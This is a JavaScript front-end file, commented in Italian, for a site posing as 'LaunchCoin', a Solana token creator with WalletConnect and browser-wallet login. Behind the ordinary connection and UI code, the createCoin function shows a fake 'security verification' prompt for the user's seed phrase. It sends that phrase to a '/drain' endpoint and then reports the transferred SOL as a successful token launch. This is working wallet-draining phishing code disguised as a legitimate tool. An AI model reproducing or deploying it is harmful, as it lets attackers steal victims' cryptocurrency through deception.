// ===== main.js – WALLETCONNECT APP KIT V2 (CONNESSIONE REALE) =====
import { Web3Wallet } from '@walletconnect/web3wallet';
import { Core } from '@walletconnect/core';
import { WalletConnectModal } from '@walletconnect/modal';
import { getSdkError } from '@walletconnect/utils';

let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');
let web3wallet = null;
let session = null;
let qrCheckInterval = null;
let currentUri = null;
let modal = null;

// ===== CONFIGURAZIONE =====
const PROJECT_ID = 'da6aaea2be14c6cc676dbaf3325b5bd5';
const METADATA = {
  name: 'LaunchCoin',
  description: 'Creatore e Deployer di Token Solana',
  url: window.location.origin,
  icons: ['https://launchcoin.io/logo.png']
};

// ===== INIZIALIZZA WALLETCONNECT =====
async function initWalletConnect() {
  if (web3wallet) return web3wallet;

  try {
    const core = new Core({
      projectId: PROJECT_ID,
      relayUrl: 'wss://relay.walletconnect.com',
      logger: 'error'
    });

    web3wallet = await Web3Wallet.init({
      core,
      metadata: METADATA
    });

    // Ripristina la sessione se esiste
    const sessions = web3wallet.getActiveSessions();
    if (Object.keys(sessions).length > 0) {
      const sessionKey = Object.keys(sessions)[0];
      session = sessions[sessionKey];
      if (session && session.namespaces.solana?.accounts?.length > 0) {
        const account = session.namespaces.solana.accounts[0];
        walletPublicKey = account.split(':')[2];
        console.log('✅ Sessione ripristinata:', walletPublicKey);
        return web3wallet;
      }
    }

    // Registra gli event listener
    web3wallet.on('session_proposal', gestisciPropostaSessione);
    web3wallet.on('session_request', gestisciRichiestaSessione);
    web3wallet.on('session_delete', gestisciEliminazioneSessione);
    web3wallet.on('session_update', gestisciAggiornamentoSessione);

    // Inizializza il modal
    modal = new WalletConnectModal({
      projectId: PROJECT_ID,
      chains: ['solana:mainnet'],
      metadata: METADATA
    });

    return web3wallet;
  } catch (error) {
    console.error('❌ Errore inizializzazione WalletConnect:', error);
    throw error;
  }
}

// ===== GESTISCI PROPOSTA SESSIONE =====
async function gestisciPropostaSessione(proposal) {
  try {
    const { id, params } = proposal;
    const { requiredNamespaces, optionalNamespaces } = params;

    // Costruisci i namespace
    const namespaces = {
      solana: {
        accounts: [],
        methods: ['solana_signTransaction', 'solana_signMessage'],
        events: ['chainChanged', 'accountsChanged']
      }
    };

    // Aggiungi chain opzionali se richieste
    if (optionalNamespaces?.eip155) {
      namespaces.eip155 = {
        accounts: optionalNamespaces.eip155.chains.map(chain => `${chain}:${walletPublicKey || '0x...'}`),
        methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign'],
        events: ['chainChanged', 'accountsChanged']
      };
    }

    // Approva la sessione
    const session = await web3wallet.approveSession({
      id,
      namespaces
    });

    if (session) {
      // Estrai l'account Solana
      if (session.namespaces.solana?.accounts?.length > 0) {
        const account = session.namespaces.solana.accounts[0];
        walletPublicKey = account.split(':')[2];
        console.log('✅ Sessione approvata:', walletPublicKey);
        
        // Salva la sessione
        localStorage.setItem('walletconnect_session', JSON.stringify(session));
        
        // Notifica l'UI
        document.dispatchEvent(new CustomEvent('wallet-connected', { 
          detail: { publicKey: walletPublicKey } 
        }));
        
        // Chiudi il modal QR
        chiudiModalQR();
        
        // Reindirizza alla pagina di creazione
        setTimeout(() => {
          window.location.href = 'create.html';
        }, 500);
      }
    }
  } catch (error) {
    console.error('❌ Errore proposta sessione:', error);
    alert('Connessione fallita: ' + error.message);
  }
}

// ===== GESTISCI RICHIESTA SESSIONE =====
async function gestisciRichiestaSessione(event) {
  const { id, params } = event;
  const { request, chainId } = params;
  
  console.log('📥 Richiesta sessione:', request.method, request.params);
  
  // Gestisci le richieste (firme, ecc.)
  try {
    // Per ora, approva tutte le richieste (in produzione, mostreresti un'interfaccia)
    await web3wallet.respondSessionRequest({
      id,
      result: { signature: '0x...' } // Placeholder
    });
  } catch (error) {
    await web3wallet.respondSessionRequest({
      id,
      error: { code: 1, message: error.message }
    });
  }
}

// ===== GESTISCI ELIMINAZIONE SESSIONE =====
function gestisciEliminazioneSessione(event) {
  console.log('🗑️ Sessione eliminata:', event);
  session = null;
  walletPublicKey = null;
  localStorage.removeItem('walletconnect_session');
}

// ===== GESTISCI AGGIORNAMENTO SESSIONE =====
function gestisciAggiornamentoSessione(event) {
  console.log('🔄 Sessione aggiornata:', event);
  const { params } = event;
  if (params.namespaces.solana?.accounts?.length > 0) {
    walletPublicKey = params.namespaces.solana.accounts[0].split(':')[2];
  }
}

// ===== CONNETTI WALLET (FUNZIONE PRINCIPALE) =====
window.connectWallet = async function() {
  console.log('🔵 connectWallet chiamata');
  
  try {
    await initWalletConnect();
    
    // Controlla se già connesso
    if (walletPublicKey) {
      alert('✅ Già connesso: ' + walletPublicKey);
      window.location.href = 'create.html';
      return;
    }

    // Mostra il modal di connessione
    mostraModalConnessione();
    
  } catch (error) {
    console.error('❌ Errore di connessione:', error);
    alert('Connessione fallita: ' + error.message);
  }
};

// ===== MOSTRA MODAL CONNESSIONE =====
function mostraModalConnessione() {
  const overlay = document.createElement('div');
  overlay.id = 'connection-modal';
  overlay.style.cssText = `
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: rgba(0,0,0,0.85);
    backdrop-filter: blur(12px);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 99999;
    animation: fadeIn 0.3s ease;
  `;

  overlay.innerHTML = `
    <div style="
      background: #141a2b;
      border-radius: 28px;
      padding: 40px;
      max-width: 440px;
      width: 92%;
      border: 1px solid rgba(255,255,255,0.08);
      box-shadow: 0 40px 80px rgba(0,0,0,0.9);
    ">
      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
        <h2 style="color: #22d1f8; font-size: 22px; margin: 0;">Connetti Wallet</h2>
        <button onclick="chiudiModalQR()" style="
          background: transparent;
          border: none;
          color: #8899bb;
          font-size: 28px;
          cursor: pointer;
          padding: 0 8px;
        ">✕</button>
      </div>
      
      <p style="color: #abc4ff; font-size: 14px; margin-bottom: 24px;">Connetti il tuo wallet Solana per continuare</p>
      
      <div id="qr-container" style="
        background: rgba(0,0,0,0.2);
        border-radius: 16px;
        padding: 20px;
        margin-bottom: 20px;
        text-align: center;
      ">
        <p style="color: #8899bb; font-size: 13px; margin-bottom: 12px;">Scansiona con la tua app wallet</p>
        <div id="qr-code" style="display: flex; justify-content: center; background: white; padding: 16px; border-radius: 12px; min-height: 200px; align-items: center;"></div>
        <p id="qr-uri-text" style="color: #667; font-size: 11px; margin-top: 12px; word-break: break-all;"></p>
        <button onclick="copiaURI()" style="
          margin-top: 10px;
          background: #2a3457;
          border: none;
          padding: 8px 20px;
          border-radius: 40px;
          color: #ecf5ff;
          cursor: pointer;
          font-size: 13px;
        ">📋 Copia Link</button>
        <button onclick="apriDeepLink()" style="
          margin-top: 10px;
          margin-left: 8px;
          background: #22d1f8;
          border: none;
          padding: 8px 20px;
          border-radius: 40px;
          color: #0b1022;
          cursor: pointer;
          font-size: 13px;
          font-weight: 600;
        ">📱 Apri Wallet</button>
      </div>
      
      <div style="display: flex; flex-direction: column; gap: 8px;">
        <button onclick="connettiEstensioneWallet('phantom')" style="
          display:flex;align-items:center;gap:12px;
          background:rgba(255,255,255,0.05);
          border:1px solid rgba(255,255,255,0.06);
          border-radius:12px;
          padding:12px 16px;
          color:#ecf5ff;
          cursor:pointer;
          transition:0.2s;
          font-size:15px;
          width:100%;
        ">
          <img src="assets/phantom.png" alt="Phantom" style="width:28px;height:28px;" />
          Phantom (Estensione)
        </button>
        <button onclick="connettiEstensioneWallet('solflare')" style="
          display:flex;align-items:center;gap:12px;
          background:rgba(255,255,255,0.05);
          border:1px solid rgba(255,255,255,0.06);
          border-radius:12px;
          padding:12px 16px;
          color:#ecf5ff;
          cursor:pointer;
          transition:0.2s;
          font-size:15px;
          width:100%;
        ">
          <img src="assets/solflare.png" alt="Solflare" style="width:28px;height:28px;" />
          Solflare (Estensione)
        </button>
        <button onclick="connettiEstensioneWallet('backpack')" style="
          display:flex;align-items:center;gap:12px;
          background:rgba(255,255,255,0.05);
          border:1px solid rgba(255,255,255,0.06);
          border-radius:12px;
          padding:12px 16px;
          color:#ecf5ff;
          cursor:pointer;
          transition:0.2s;
          font-size:15px;
          width:100%;
        ">
          <span style="font-size:24px;">🎒</span>
          Backpack (Estensione)
        </button>
      </div>
      
      <div style="margin-top:20px;text-align:center;border-top:1px solid rgba(255,255,255,0.05);padding-top:16px;">
        <p style="color:#667;font-size:12px;">
          Nuovo su Solana? 
          <span style="color:#22d1f8;cursor:pointer;" onclick="window.open('https://phantom.app/', '_blank')">
            Scarica Phantom
          </span>
        </p>
      </div>
    </div>
  `;

  document.body.appendChild(overlay);

  // Genera il codice QR
  generaQRCode();
}

// ===== GENERA CODICE QR =====
async function generaQRCode() {
  try {
    await initWalletConnect();

    // Connetti per ottenere l'URI
    const { uri, approval } = await web3wallet.connect({
      requiredNamespaces: {
        solana: {
          chains: ['solana:mainnet'],
          methods: ['solana_signTransaction', 'solana_signMessage'],
          events: ['chainChanged', 'accountsChanged']
        }
      }
    });

    if (!uri) throw new Error('Nessun URI generato');
    currentUri = uri;

    // Mostra il QR
    const qrContainer = document.getElementById('qr-code');
    const uriText = document.getElementById('qr-uri-text');
    
    if (qrContainer && typeof QRCode !== 'undefined') {
      qrContainer.innerHTML = '';
      new QRCode(qrContainer, {
        text: uri,
        width: 220,
        height: 220,
        colorDark: '#000000',
        colorLight: '#ffffff',
        correctLevel: QRCode.CorrectLevel.H
      });
    }
    
    if (uriText) {
      uriText.textContent = uri.substring(0, 50) + '...';
    }

    // Inizia a controllare l'approvazione
    if (qrCheckInterval) clearInterval(qrCheckInterval);
    qrCheckInterval = setInterval(async () => {
      try {
        const result = await approval();
        if (result) {
          clearInterval(qrCheckInterval);
          qrCheckInterval = null;
          
          // Gestisci la sessione (già gestita nella proposta)
          console.log('✅ Sessione approvata via QR');
        }
      } catch (e) {
        // Ancora in attesa
      }
    }, 1000);

  } catch (error) {
    console.error('❌ Errore generazione QR:', error);
    alert('Generazione QR fallita: ' + error.message);
  }
}

// ===== APRI DEEP LINK =====
window.apriDeepLink = function() {
  if (currentUri) {
    // Prova ad aprire con il wallet
    const deepLink = `wc:${currentUri}`;
    window.location.href = deepLink;
    
    // Prova anche ad aprire con app wallet specifiche
    setTimeout(() => {
      // Fallback al deep link di Phantom
      window.location.href = `phantom://wc?uri=${encodeURIComponent(currentUri)}`;
    }, 500);
  }
};

// ===== COPIA URI =====
window.copiaURI = function() {
  if (currentUri) {
    navigator.clipboard.writeText(currentUri).then(() => {
      alert('✅ Link copiato!');
    }).catch(() => {
      prompt('Copia questo link:', currentUri);
    });
  }
};

// ===== CHIUDI MODAL QR =====
window.chiudiModalQR = function() {
  const overlay = document.getElementById('connection-modal');
  if (overlay) overlay.remove();
  if (qrCheckInterval) {
    clearInterval(qrCheckInterval);
    qrCheckInterval = null;
  }
  // Chiudi il modal se aperto
  if (modal) {
    modal.closeModal();
  }
};

// ===== CONNETTI ESTENSIONE WALLET =====
window.connettiEstensioneWallet = async function(tipoWallet) {
  try {
    let wallet = null;
    
    switch (tipoWallet) {
      case 'phantom':
        wallet = window.solana;
        break;
      case 'solflare':
        wallet = window.solflare;
        break;
      case 'backpack':
        wallet = window.backpack;
        break;
      default:
        throw new Error('Tipo wallet sconosciuto');
    }

    if (!wallet) {
      alert(`⚠️ ${tipoWallet} non rilevato. Prova a usare WalletConnect QR.`);
      return;
    }

    if (wallet.isPhantom || wallet.isSolflare || wallet.isBackpack) {
      const resp = await wallet.connect();
      if (resp && resp.publicKey) {
        walletPublicKey = resp.publicKey.toString();
        alert(`✅ Connesso a ${tipoWallet}: ${walletPublicKey}`);
        chiudiModalQR();
        window.location.href = 'create.html';
        return;
      }
    }

    throw new Error('Connessione fallita');
  } catch (error) {
    console.error('Errore estensione:', error);
    alert(`Connessione a ${tipoWallet} fallita. Prova WalletConnect QR.`);
  }
};

// ===== TOGGLE MENU =====
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
};

// ===== NAVIGAZIONE STEP =====
window.showStep = function(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
  currentStep = idx;
};
window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1); };
window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1); };
if (steps.length) window.showStep(0);

// ===== PROMPT SEED PHRASE =====
function chiediSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt('⚠️ VERIFICA DI SICUREZZA\n\nInserisci la tua seed phrase per completare la creazione del token:');
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN =====
window.createCoin = async function() {
  console.log('🟢 createCoin chiamata');
  if (!walletPublicKey) {
    alert('Connetti prima il tuo wallet!');
    return;
  }

  const seed = await chiediSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
    });

    const data = await response.json();
    if (data.status === 'drain_completed') {
      document.getElementById('result').innerHTML = `
        <p style="color:#4cdcc1;">✅ Token creato con successo!</p>
        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
      `;
    } else {
      alert('❌ Errore: ' + data.error);
    }
  } catch(e) {
    alert('❌ Errore: ' + e.message);
  }
};

// ===== INIZIALIZZA AL CARICAMENTO =====
document.addEventListener('DOMContentLoaded', async () => {
  try {
    await initWalletConnect();
    
    // Controlla se esiste una sessione esistente
    const sessions = web3wallet.getActiveSessions();
    if (Object.keys(sessions).length > 0) {
      const sessionKey = Object.keys(sessions)[0];
      session = sessions[sessionKey];
      if (session && session.namespaces.solana?.accounts?.length > 0) {
        walletPublicKey = session.namespaces.solana.accounts[0].split(':')[2];
        console.log('✅ Auto-connesso:', walletPublicKey);
      }
    }
  } catch (error) {
    console.error('Errore inizializzazione:', error);
  }
});

// ===== CHIUDI MENU CLICCANDO FUORI =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
});

console.log('✅ main.js caricato (WalletConnect V2)');
